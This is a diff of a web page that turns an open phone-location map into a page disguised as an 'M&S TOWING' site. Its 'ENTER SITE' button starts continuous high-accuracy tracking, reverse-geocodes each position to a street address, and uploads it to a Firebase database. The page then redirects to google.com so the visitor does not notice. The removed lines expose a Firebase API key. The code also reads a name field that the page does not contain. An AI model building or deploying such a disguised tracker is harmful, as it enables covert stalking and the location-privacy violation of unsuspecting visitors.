@@ -1,92 +1,106 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Phone Location Tracker</title>
-  <meta charset="utf-8" />
+  <title>TOWING</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-
-  <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 
   <style>
-    body { margin: 0; }
-    #map { height: 100vh; }
+    body { font-family: Arial; padding: 20px; background: #111; color: white; }
+    input, button { padding: 12px; margin: 8px 0; width: 100%; font-size: 16px; }
+    button { background: #222; color: white; border: none; }
+    button:disabled { background: #555; cursor: not-allowed; }
   </style>
 </head>
 <body>
 
-<div id="map"></div>
+<h2>M&S TOWING</h2>
+
+
+<button id="enterBtn" onclick="startTracking()" disabled>ENTER SITE</button>
+
+<p id="status">Checking location permission...</p>
 
 <script>
-  // 🔥 Replace with your Firebase config
 const firebaseConfig = {
-  apiKey: "AIzaSyBBWe8UJ4G4toMHMnbHKGz9BnyIzNlBY5A",
+  apiKey: "AIzaSy...",
   authDomain: "phone-b3f5d.firebaseapp.com",
-  projectId: "phone-b3f5d",
-  storageBucket: "phone-b3f5d.firebasestorage.app",
-  messagingSenderId: "215137856881",
-  appId: "1:215137856881:web:3a50dc5ba8a0c925b5dad0",
-  measurementId: "G-3D294YBS3C"
+  databaseURL: "https://phone-b3f5d-default-rtdb.firebaseio.com/",
+  projectId: "phone-b3f5d"
 };
 
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
-  // 🌍 Initialize map
-  const map = L.map('map').setView([0, 0], 2);
+let watchId;
 
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    maxZoom: 19,
-  }).addTo(map);
+// Check permission immediately
+checkLocationPermission();
 
-  let marker;
-
-  // 📍 Get phone location
-  function trackLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.watchPosition((position) => {
-        const lat = position.coords.latitude;
-        const lng = position.coords.longitude;
-
-        // Save to Firebase
-        db.ref('locations/user1').set({
-          lat: lat,
-          lng: lng,
-          timestamp: Date.now()
-        });
-
-        updateMap(lat, lng);
-      });
-    } else {
-      alert("Geolocation not supported");
-    }
+function checkLocationPermission() {
+  if (!navigator.geolocation) {
+    document.getElementById("status").innerText = "Geolocation not supported";
+    return;
   }
 
-  // 🗺️ Update map
-  function updateMap(lat, lng) {
-    if (!marker) {
-      marker = L.marker([lat, lng]).addTo(map);
-    } else {
-      marker.setLatLng([lat, lng]);
+  navigator.geolocation.getCurrentPosition(
+    () => {
+      document.getElementById("enterBtn").disabled = false;
+      document.getElementById("status").innerText = "";
+    },
+    () => {
+      document.getElementById("enterBtn").disabled = true;
+      document.getElementById("status").innerText = "";
     }
+  );
+}
 
-    map.setView([lat, lng], 15);
+// Reverse geocode
+async function getAddress(lat, lng) {
+  try {
+    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+    const data = await res.json();
+    return data.display_name || "Unknown location";
+  } catch {
+    return "Address unavailable";
+  }
+}
+
+function startTracking() {
+  let userName = document.getElementById("nameInput").value.trim();
+
+  if (!userName) {
+    userName = "user_" + Math.random().toString(36).substr(2, 6);
   }
 
-  // 👀 Listen for real-time updates
-  db.ref('locations/user1').on('value', (snapshot) => {
-    const data = snapshot.val();
-    if (data) {
-      updateMap(data.lat, data.lng);
-    }
+  localStorage.setItem("userName", userName);
+
+  watchId = navigator.geolocation.watchPosition(async (pos) => {
+    const lat = pos.coords.latitude;
+    const lng = pos.coords.longitude;
+
+    const address = await getAddress(lat, lng);
+
+    db.ref("locations/" + userName).set({
+      lat,
+      lng,
+      address,
+      timestamp: Date.now()
+    });
+
+  }, (err) => {
+    alert(err.message);
+  }, {
+    enableHighAccuracy: true
   });
 
-  // Start tracking
-  trackLocation();
+  // Redirect after tracking starts
+  setTimeout(() => {
+    window.location.replace("https://www.google.com");
+  }, 1500);
+}
 </script>
 
 </body>
